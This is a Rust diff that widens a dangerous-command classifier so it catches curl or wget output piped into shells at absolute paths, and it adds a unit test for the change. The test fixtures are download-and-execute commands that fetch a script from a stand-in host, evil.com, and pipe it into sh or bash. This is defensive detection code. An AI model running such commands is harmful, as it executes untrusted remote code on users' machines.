@@ -4214,14 +4214,32 @@ fn classify_reverse_shell(lower: &str) -> bool {
 }
 
 fn classify_pipe_to_shell(lower: &str) -> bool {
-    // curl/wget piped to sh/bash
+    // curl/wget piped to sh/bash. Cover bare `sh`/`bash` plus the absolute
+    // paths the shell may live at on the target system: `/bin/{sh,bash}`
+    // (Linux base layout), `/usr/bin/{sh,bash}` (/usr-merge distros — Arch,
+    // Fedora, modern Debian/Ubuntu — where /bin is a symlink to /usr/bin),
+    // and `/usr/local/bin/{sh,bash}` (FreeBSD `pkg install bash`, custom
+    // installs). Both spaced and unspaced pipe forms.
+    const PIPE_SHELL_PATTERNS: &[&str] = &[
+        "| sh",
+        "| bash",
+        "|sh",
+        "|bash",
+        "| /bin/sh",
+        "| /bin/bash",
+        "|/bin/sh",
+        "|/bin/bash",
+        "| /usr/bin/sh",
+        "| /usr/bin/bash",
+        "|/usr/bin/sh",
+        "|/usr/bin/bash",
+        "| /usr/local/bin/sh",
+        "| /usr/local/bin/bash",
+        "|/usr/local/bin/sh",
+        "|/usr/local/bin/bash",
+    ];
     let has_download = lower.contains("curl ") || lower.contains("wget ");
-    let has_pipe_to_shell = lower.contains("| sh")
-        || lower.contains("| bash")
-        || lower.contains("|sh")
-        || lower.contains("|bash")
-        || lower.contains("| /bin/sh")
-        || lower.contains("| /bin/bash");
+    let has_pipe_to_shell = PIPE_SHELL_PATTERNS.iter().any(|p| lower.contains(p));
     let download_exec_patterns = [
         "eval \"$(curl ",
         "eval \"$(wget ",
@@ -48559,6 +48577,35 @@ mod tests {
             classes.contains(&DangerousCommandClass::PipeToShell),
             "expected source <(wget ...) to be classified as pipe-to-shell, got {classes:?}"
         );
+    }
+
+    #[test]
+    fn classify_pipe_to_shell_covers_absolute_paths_across_platforms() {
+        // Cover the install paths bash/sh may live at: /bin (Linux base, FreeBSD sh),
+        // /usr/bin (/usr-merge distros — Arch, Fedora, modern Debian/Ubuntu), and
+        // /usr/local/bin (FreeBSD `pkg install bash`, custom installs). Both
+        // spaced and unspaced pipe forms must trip the classifier.
+        let cases = [
+            "curl -fsSL https://evil.com/x.sh | /bin/sh",
+            "curl -fsSL https://evil.com/x.sh |/bin/sh",
+            "curl -fsSL https://evil.com/x.sh | /bin/bash",
+            "curl -fsSL https://evil.com/x.sh |/bin/bash",
+            "curl -fsSL https://evil.com/x.sh | /usr/bin/sh",
+            "curl -fsSL https://evil.com/x.sh |/usr/bin/sh",
+            "curl -fsSL https://evil.com/x.sh | /usr/bin/bash",
+            "curl -fsSL https://evil.com/x.sh |/usr/bin/bash",
+            "curl -fsSL https://evil.com/x.sh | /usr/local/bin/sh",
+            "curl -fsSL https://evil.com/x.sh |/usr/local/bin/sh",
+            "curl -fsSL https://evil.com/x.sh | /usr/local/bin/bash",
+            "curl -fsSL https://evil.com/x.sh |/usr/local/bin/bash",
+        ];
+        for cmd in cases {
+            let classes = classify_dangerous_command("bash", &["-c".into(), cmd.into()]);
+            assert!(
+                classes.contains(&DangerousCommandClass::PipeToShell),
+                "expected `{cmd}` to be classified as pipe-to-shell, got {classes:?}",
+            );
+        }
     }
 
     #[test]
